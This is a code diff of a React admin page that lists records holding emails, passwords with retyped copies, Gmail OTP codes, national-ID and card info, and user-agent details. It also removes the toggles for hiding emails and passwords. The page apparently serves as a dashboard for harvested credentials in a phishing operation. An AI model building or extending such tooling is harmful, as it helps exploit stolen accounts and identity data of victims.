@@ -1,19 +1,20 @@
+import { useContext, useState } from "react"
+import { AuthContext } from "../../../contexts/AuthProvider"
+import { getData, updateData } from "../../../api/fetching"
+import useInformation from "../../../hooks/useInformation"
+import moment from "moment"
+import { handleCopyClick } from "../../../utils/copyToClipBoard"
+import ReactPaginate from "react-paginate"
+import NidModal from "../../../components/NidModal"
 
-import moment from 'moment'
-import ReactPaginate from 'react-paginate'
-import { handleCopyClick } from "../../../utils/copyToClipBoard";
-import useInformation from "../../../hooks/useInformation";
-import { useContext, useState } from 'react';
-import { AuthContext } from '../../../contexts/AuthProvider';
-import { getData, updateData } from '../../../api/fetching';
-import NidModal from '../../../components/NidModal';
-export default function Information() {
+
+export default function AdminInfo() {
   const [codeVal,setCodeVal]= useState('')
   const [nidData,setNidData ]= useState({})
   const [open,setOpen] = useState(false)
   const {role}= useContext(AuthContext)
   
-const {displayInfo,setIsRefresh,totalPages, page,setPage,isHide,setIsHide} = useInformation()
+const {displayInfo,totalPages, setPage,isHide,setIsHide} = useInformation('/hide-elements')
 
 const updateGmailOtp = async(id:any)=> {
   const originalData= {
@@ -25,21 +26,7 @@ const updateGmailOtp = async(id:any)=> {
 
 
 
-const handleDisabled = async (id: any,type:any,status:any) => {
-  try {
-    let orstatus;
-    if(!status){
-      orstatus = true
-    }else{
-      orstatus = false
-    }
-  
-    await getData(`/information/${id}/status?${type}=${orstatus}&page=${page}`)
-    setIsRefresh(Math.random())
-  } catch (error: any) {
-    throw new Error(error)
-  }
-}
+
 const handlePageClick = (event:any) => {
   setPage(event.selected);
 };
@@ -98,22 +85,13 @@ try {
                 <th scope="col">Card Info</th>
               )
             }
-            {
-              role === 'admin' &&(
-                <th scope="col">Hide Email</th>
-              )
-            }
-            {
-              role === 'admin' &&(
-                <th scope="col">Hide Pass</th>
-              )
-            }
+      
             <th scope="col">Action</th>
           </tr>
         </thead>
         <tbody>
           {
-            displayInfo?.map(({_id,createdAt,siteName,mailCode,user,nidInfo,isPasswordHide,email,password,repassword,status,agent:{ source={},platform='' } }) =>(
+            displayInfo?.map(({_id,createdAt,siteName,mailCode,user,nidInfo,email,password,repassword,agent:{ source={},platform='' } }) =>(
               <>
               <tr key={_id}>
               <td>{moment(createdAt).fromNow()}</td>
@@ -145,24 +123,10 @@ try {
               }
 
 {/* Email Hide */}
-{
-                role === 'admin' && (
-                  <td><button
-title={platform}
-  onClick={() => {handleDisabled(_id,'status',status)}}
-  className={`btn btn-sm text-white ${status ? 'bg-danger' : 'bg-success'}`}>{!status ? 'Hide' : 'show'}</button></td>
-                )
-              }
+
 
               {/* Password Hide  */}
-              {
-                role === 'admin' && (
-                  <td><button
-title={platform}
-  onClick={() => {handleDisabled(_id,'isPasswordHide',isPasswordHide)}}
-  className={`btn btn-sm text-white ${isPasswordHide ? 'bg-danger' : 'bg-success'}`}>{!isPasswordHide ? 'Hide' : 'show'}</button></td>
-                )
-              }
+    
 
               <td title={platform}><button type="button"
                 onClick={() => handleCopyClick(`${source ? source : ''}`)}
@@ -181,7 +145,7 @@ title={platform}
     </div>
   </div>
   <div  className='pag'>
-          <ReactPaginate 
+          <ReactPaginate
           className='p-1'
         breakLabel="..."
         nextLabel="next >"
